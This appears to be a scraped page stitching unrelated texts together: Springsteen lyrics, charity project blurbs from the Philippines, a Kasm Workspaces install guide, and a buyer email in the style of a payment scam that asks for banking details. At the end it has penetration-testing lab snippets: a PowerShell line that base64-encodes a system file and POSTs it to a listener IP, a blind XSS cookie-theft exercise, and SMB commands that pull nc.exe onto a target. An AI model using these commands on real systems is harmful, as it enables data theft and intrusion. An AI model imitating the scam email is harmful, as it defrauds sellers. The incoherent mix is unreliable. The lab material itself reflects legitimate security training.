[Verse 1]
Hey there, mister
Can you tell me what happened to the seeds I've sown?
Can you gimme a reason, sir
As to why they've never grown?
They've just blown around from town to town
'Til they're back out on to these fields
Yeah, where they fall from my hand
Back into the dirt of this hard land (Come on)

[Verse 2]
Now me and my sister
From Germantown, yeah, we did ride
Well, we made our bed, sir
From the rock on the mountainside
We've been blowin' around from town to town
Lookin' for a place to land
Where the sun bursts through the clouds to fall like a circle
Like a circle of fire down on this hard land

[Verse 3]
Now even the rain it don't come 'round
Don't come 'round here no more
And the only sound at night's the wind
Slammin' that back-porch door
It just stirs you up like it wants to just blow you down
Twistin' and churnin' up the sand
And leavin' all them scarecrows lyin' face down
Face down in the dirt of this hard land
See Bruce Springsteen Live
Get tickets as low as $30

[Verse 4]
From a building up on the hill
I can hear a tape deck blastin' "Home on the Range"
And I can see them Bar-M choppers
Sweepin' low across the plains
And it's me and you, Frank, we're lookin' for lost cattle
Our hooves twistin' and churnin' up the sand
We're ridin' in the whirlwind, searchin' for lost treasure
Way down south of the Rio Grande
We're ridin' 'cross that river in the moonlight
Yeah, up onto the banks of this hard land

[Verse 5]
Hey Frank, won't you pack your bags
And meet me tonight down at Liberty Hall?
Now just one kiss from you, my brother
And we'll ride until we fall
We'll sleep in the fields, we'll sleep by the rivers
And in the morning we'll make a plan
Well, if you can't make it stay hard, stay hungry, stay alive, if you can
And meet me in a dream of this hard land (Oh)

Good Day.
Is the Westend 900V2 hay conditioner still available for sale?

I'm so sorry for the late in my response.  
I have been so I'll and i just recovered fully. 

Plz i'll love to move on with this purchase immediately.

I hope we are fixed on $13,000usd which is about $17,500 CAD  which includes shipping to my address here in Avondale, Arizona.

I actually found a logistic agent that can get the hay conditioner unit to my address for way more cheaper cost.

if you are going to charge me just for the Westend 900V2 hay conditioner unit without shipping, what cost will that be?

Kindly let me know so that i can do the calculation. 

i'll standby for your response so that i can decide based on your estimation of the hay conditioner's cost without the shipping expenses included so that i can instruct the initiation of payment.

Lastly, confirm your banking details to be accurate and correct before payment is initiate.

Mission
To work together for the upliftment of the economic, educational and social status of the Filipino Muslims and the poor and needy segments of the Philippine society thru welfare programmes in cooperation with the welfare and development agencies in order to attain total human development. 

Vision
To create better understanding thru mutual respect, help and cooperation among our peoples taking into consideration the values and guidance laid down by the Almighty God. 







Summary
Mothers and babies die unnecessarily during childbirth in the Philippines because often families don't have money to pay a skilled birth attendant. Mercy In Action midwives provide free childbirth services and education to empower women through evidence-based maternity services and birth. Empowered mothers have healthier babies and become powerful agents of change for the family, which results in our maternal and neonatal mortality rates being 4-times lower than the country of the Philippines.

Challenge
Mothers and babies die in childbirth when they have no skilled birth attendant at the birth, due to anemia, hemorrhage, infection, hypertension disorders, and obstructed labor. Mothers who deliver in Mercy In Action's birth center receive excellent prenatal care, vitamins, and childbirth education. During delivery, they are given the benefit of up-to-date evidence-based midwifery practices in a clean, well-stocked mother-friendly and baby-friendly environment.

Solution
We can prevent the most common causes of maternal death during childbirth. We can prevent anemia and malnutrition in the pregnant women, preventing prematurity and infection in the baby. Mothers deliver in a safe, compassionate environment where there is never a user fee for services or medicines. Mercy In Action empowers women to become part of the solution rather than the problem, as they learn how to care for, and advocate for, themselves, their children, and the health of their community.

Long-Term Impact
Mercy In Action has provided 15,200 free deliveries in the Philippine! Our statistics were printed by medical anthropologist Robbie Davis-Floyd in her book"Birth Models That Work". We know this to be true: How a woman is treated during care for pregnancy and childbirth has one of two effects: It either empowers her or it disempowers and diminishes her as a human being. Women say that to birth at Mercy In Action is to be empowered to be better mothers as well as community health advocates!

Summary
Globally, Muslim women have lacked educational opportunities to benefit their communities even though nurses are the framework of public health. In 2015, AAI began supporting a Nursing program in Sulu Province, Philippines; a region of 19 island districts, a population of 1 million, and only 16 medical doctors. Our goal was to provide 50 female students with a quality education to launch their nursing careers. Thus far, AAI has helped 240 young women to become nurses.

Challenge
Muslim females of all ages around the world lack the opportunity to receive a quality education and to develop professional skills to remedy the health, social, and economic needs of their communities. In the Philippines, Sulu State College, Mindanao State University, Notre Dame College, and Fatima University can provide such opportunities for Muslim girls. However, in Mindanao, the schools are surrounded by high poverty and communal violence. Students struggle to complete their studies.

Solution
Each semester, we support up to 50 additional female nursing students with basic educational needs, classroom materials, graduation fees, and the cost of licensing exams. These young women demonstrate potential success for Muslim women around the world. As healthcare providers, the nurses will provide vital services to all community members and expand the employment base in one of the most economically deprived areas of the world. They are also positive symbols for local youth.

Long-Term Impact
The nursing programs in Sulu are a beacon of hope for the entire community. Our goal is to build a quality health system accessible to all. Supported by AAI, Sulu State College and MSU nursing students are now performing among the top 20 percent of all such schools in the Philippines - compared to a 30 percent student pass rate in 2015. AAI has helped support the successful licensing of some 240 new nurses in Sulu. As peacebuilders, we must now sustain this success.

Supporting Small Business for Poor Entrepreneurs

Summary
We will provide small loans in 2 municipalities in Zamboanga del Norte to help beneficiaries establish or expand small businesses. WAND will be mentored by TCP Global, pro-bono consultants with 15 years of experience building sustainable micro-loan programs. After the initial funds are invested twice, assuming a repayment rate of at least 95%, the program will qualify for additional installments until the permanent loan pool reaches full capacity and the fund will revolve in the community.


Challenge
Marginalized micro-entrepreneurs, particularly in small communities, often have no source for the loans they need to expand their businesses other than daily lenders who sometimes charge up to 10% interest per month or even higher. Traditional lenders typically require collateral and are not interested in micro-loans. Businesses on the lowest rung of the economic ladder have very few sources for small, low interest loans.

Solution
We will provide initial loans to clients already known to our organization who have experience in the business for which they seek a loan. These clients already have a trust relationship with us which makes these small loans a good credit risk. Before receiving a loan, borrowers will learn that their compliance with the loan repayment terms will help to build a permanent loan resource for their community. The initial fund will then revolve and expand in the community.

Long-Term Impact
Using the TCP Global model and mentored by pro bono TCP Global team, this $1500 investment is expected to fund short-term micro-loans which will be a first step towards building a sustainable loan pool sufficient to meet micro-loan needs of the community. Successful loan recipients will be invited to help mentor new borrowers and assist with administration of the program thus creating a sense of ownership and facilitating sustainability.

Providing Food to Hungry and Malnourished Childre

Summary
We will provide food to 1,200 hungry and malnourished children living in remote villages with particular focus to those who are severely affected by the Coronavirus pandemic, extreme changes in the weather and poor farm harvest as a result of soil degradation and loss of natural resources. In so doing, we aim to improve children's well-being and ensure that they become productive members of their communities.




Challenge
Children of poor families are beset with severe changes in climate, the ill effects of the Coronavirus pandemic, loss of soil fertility making farming unproductive and host of other factors. Many of them go hungry and malnourished and later on, when they grow, they become unproductive adults with little chances of improvement and giving a share to their communities.

Solution
Immediate food supply for hungry and malnourished children is imperative in order for them to live happy and contented lives and later on to become productive adults able to contribute to their communities. Aside from food supply, we will also provide for their other needs like medicines, toys, school supplies and other needs. We will also provide small farm-based livelihoods to their parents and the community for sustainability.

Long-Term Impact
Improvement in the health and nutrition of children is very much needed in order for them to grow as well-grounded and healthy adults able to contribute much to their own families as well as to their communities. With so much problems impacting negatively to their lives, the need is indeed urgent.

Feed Starving Children


Summary
This project will provide food support to 1,200 starving children living in remote barrios in Mindanao, the Philippines by providing them with rice, milk, dried fish, meat and vegetables. We will also provide seeds and train their families to grow their own food by using resources around the house.

$60,000 total goal    $30,211  remaining   207 donors 5 monthly donors  1 fundraiser  5 years



Challenge
Climate change, poor, infertile soil and severe dry season makes poor families here go hungry. Suffering much are children who needs to be nurtured to become health adults. Providing them with nutritious food will improve their living conditions while their families grow vegetables and root crops for sustainability.

Solution
We will provide immediate food aid to starving children while we train and provide seeds and garden tools to their families in order to improve their health and nutrition. Gardening will be by using local resources and available spaces around the house.

Long-Term Impact
Improvement of the living conditions of poor, very vulnerable children by providing them with much-needed highly nutritious food and gardening support.

Food, Livelihood, Nutrition Support for Women

Summary
The project will provide food, livelihood and nutrition support for 700 poor women and their families so that they are able to live with dignity.

Challenge
Poor women, especially that of single, women-led households are often at a severe disadvantage. They need food, nutrition and livelihood support for long-term survival. When they reside in poor communities, their neighbors are equally poor too and would not be able to help themselves. There is a great need to improve their situation so that they are able to live with dignity, fully participating in the life of the community,

Solution
The project will provide immediate food and nutrition assistance to poor women. Then we will mount a comprehensive program of livelihood support that will include training, provision of start-up capital and mentoring so that they are able to sustain their business. In so doing we help them surmount the great difficulty that they are facing.

Long-Term Impact
Improvement in the lives of poor women through direct food and nutrition support and livelihood nurturing in order for them to be active and good members of the communities where they are located.

Life Changing Care for Disabled Filipino Children

Summary
This project will provide life changing care to physically disabled children from impoverished Filipino families. We help develop a treatment plan, locate services needed, and with our partners and service providers we are able to secure treatment free or at a reduced cost. Our primary purpose is to cover travel expenses for one child and a parent. We also provide funds for health insurance, doctor visits, diagnostic services, orthotics, etc. as needed.



Challenge
In the Philippines, more than a fifth of the population live in poverty, most have a low level of education and strong beliefs. Having a disabled child in this situation makes the child an object of discrimination, isolation, and ridicule. Often, they are pulled out of school and this ends their hope for a productive life. There are very few sponsored government resources to help these children, so they often end up with little hope, a limited future and completely relying on their family.

Solution
Many families do not have the skills or the means to work with doctors or service providers to obtain a professional diagnosis for their child's condition. We assist the family in getting this done. If needed we purchase health insurance to assist our partners with their cost. We work with partners to develop a treatment plan, surgical intervention, physical therapy, etc. If surgery is needed, we cover all expenses of travel, housing and food for child and parent to Tebow Cure Hospital in Davao.

Long-Term Impact
We currently have identified at least 20 disabled children who we hope to help during 2021. Providing the appropriate treatment for their physical disabilities will provide these children hope for a better life, allowing them to become productive members of their families and communities while shedding the stigma of being a burden. Your help will change the direction of these children's lives so they can become productive members of society.

What is Kasm Workspaces?
Kasm Workspaces is a docker container streaming platform that enables you to deliver browser-based access to desktops, applications, and web services. Kasm uses a modern DevOps approach for programmatic delivery of services via Containerized Desktop Infrastructure (CDI) technology to create on-demand, disposable, docker containers that are accessible via web browser. - https://github.com/kasmtech/workspace...
 
Installing Docker
   01. Log into the Linux based device
   02. Run the following commands in the terminal
         install prerequisites
         sudo apt install apt-transport-https ca-certificates curl software-properties-common gnupg-agent -y
         add docker gpg key
         curl -fsSL https://download.docker.com/linux/$(awk -F'=' '/^ID=/{ print $NF }' /etc/os-release)/gpg | sudo apt-key add -
         add docker software repository
         sudo add-apt-repository "deb [arch=$(dpkg --print-architecture)] https://download.docker.com/linux/$(awk -F'=' '/^ID=/{ print $NF }' /etc/os-release) $(lsb_release -cs) stable"
         install docker
         sudo apt install docker-ce docker-compose containerd.io -y
         enable and start docker service
         sudo systemctl enable docker && sudo systemctl start docker
         add the current user to the docker group
         sudo usermod -aG docker $USER
         reauthenticate for the new group membership to take effect
         su - $USER
 
Deploying Kasm Workspaces [Simple Method]
This is the recommended installation method, but requires the most disk space. I choose to be more selective about the Kasm images running, so I use the second installation option outlined later on.
 
   01. Continue with the following commands in a terminal window
         change directory to /tmp
         cd /tmp
         download the latest kasm workspaces release
         curl -O https://kasm-static-content.s3.amazon...
         extract the downloaded tar.gz
         tar -xf kasm_release*.tar.gz
         execute the installation script
         sudo bash kasm_release/install.sh
   02. Take note of the credentials displayed in the output
   03. Open a web browser and navigate to https://DNSorIP
   04. Log in using username admin@kasm.local and the password found in the installation output
 
Deploying Kasm Workspaces [Selective Method]
This method can use far less disk space, but requires more time and setup to add Kasm images manually. I only add the Kasm images I use regularly.
 
   01. Continue with the following commands in a terminal window
         change directory to /tmp
         cd /tmp
         download the latest kasm workspaces release
         curl -O https://kasm-static-content.s3.amazon...
         extract the downloaded tar.gz
         tar -xf kasm_release*.tar.gz
         execute the installation script
         installing only the core images
         and setting a custom https port
         sudo bash kasm_release/install.sh -I -L 8443
   02. Take note of the credentials displayed in the output
   03. Open a web browser and navigate to https://DNSorIP:8443
   04. Log in using username admin@kasm.local and the password found in the installation output
 
Adding Kasm Desktop/Application Images
   01. Navigate to https://hub.docker.com/u/kasmweb to view the available Kasm images
   02. Select Admin at the top of the Kasm web UI
   03. Select Images from the left navigation menu
   04. Click the Add Image button
   05. Complete the Add Image form as follows (Adding Brave Browser in this example)
         Docker Image: kasmweb/brave:1.11.0-rolling
         Description: Brave Browser
         Friendly Name: Brave Browser
         Thumbnail URL: https://upload.wikimedia.org/wikipedi...
         Cores: 1
         Memory (MB): 1024
         GPU Count: 0
         Docker Registry: hub.docker.com
         Persistent Profile Path: /home/{username}/brave
   06. Scroll to the bottom of the form and click the Submit button
   07. Click Workspaces at the top of the Kasm web UI
   08. Click the new image ≫ Click Launch Session

Become a File Upload Expert: Harnessing the Power of PowerShell, Python Upload Server, Ncat & Base64
(PowerShell Base64 Web Upload
Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

PowerShell Script to Upload a File to Python Upload Server
PS C:\htb# $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb# Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64)




How Hackers Use Blind XSS to Secretly Take Over Your Session!

Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.

Blind XSS Detection
We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a Blind XSS vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Question - identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.


PowerShell and SMB Protocol: The Dynamic Duo for File Transfers
We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.
start the SMB server from linux
$ sudo impacket-smbserver share -smb2support /tmp/smbshare
Copy a file from SMB server:
C:\htb$ copy \\192.168.220.133\share\nc.exe
To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
Mount the SMB Server with Username and Password
C:\htb$ net use n: \\192.168.220.133\share /user:test test
